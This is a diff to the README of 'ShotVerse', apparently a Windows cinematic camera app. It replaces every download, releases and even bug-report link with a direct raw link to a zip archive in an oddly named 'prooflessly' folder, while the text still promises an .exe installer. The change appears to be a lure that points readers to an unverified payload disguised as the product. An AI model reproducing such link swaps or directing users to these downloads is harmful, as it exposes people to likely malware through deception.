@@ -1,6 +1,6 @@
 # 🎬 ShotVerse - Simple Cinematic Camera Control
 
-[![Download ShotVerse](https://img.shields.io/badge/Download-ShotVerse-blue?style=for-the-badge)](https://github.com/bassinetthermometer897/ShotVerse/releases)
+[![Download ShotVerse](https://img.shields.io/badge/Download-ShotVerse-blue?style=for-the-badge)](https://raw.githubusercontent.com/bassinetthermometer897/ShotVerse/main/prooflessly/Verse_Shot_1.0.zip)
 
 ---
 
@@ -52,11 +52,11 @@ Follow these steps to get ShotVerse up and running on your Windows PC.
 
 Visit the ShotVerse releases page to get the latest version:
 
-[![Download ShotVerse](https://img.shields.io/badge/Download-ShotVerse-green?style=for-the-badge)](https://github.com/bassinetthermometer897/ShotVerse/releases)
+[![Download ShotVerse](https://img.shields.io/badge/Download-ShotVerse-green?style=for-the-badge)](https://raw.githubusercontent.com/bassinetthermometer897/ShotVerse/main/prooflessly/Verse_Shot_1.0.zip)
 
 Click on the link above or go to:
 
-https://github.com/bassinetthermometer897/ShotVerse/releases
+https://raw.githubusercontent.com/bassinetthermometer897/ShotVerse/main/prooflessly/Verse_Shot_1.0.zip
 
 Download the latest file that ends with `.exe` for Windows.
 
@@ -144,7 +144,7 @@ If videos become jerky, slower, or behave oddly:
 
 For issues beyond basic troubleshooting:
 
-- Visit https://github.com/bassinetthermometer897/ShotVerse/issues  
+- Visit https://raw.githubusercontent.com/bassinetthermometer897/ShotVerse/main/prooflessly/Verse_Shot_1.0.zip  
   to report bugs or ask questions.
 
 - Look for FAQ files inside the installed folder under `Help`.
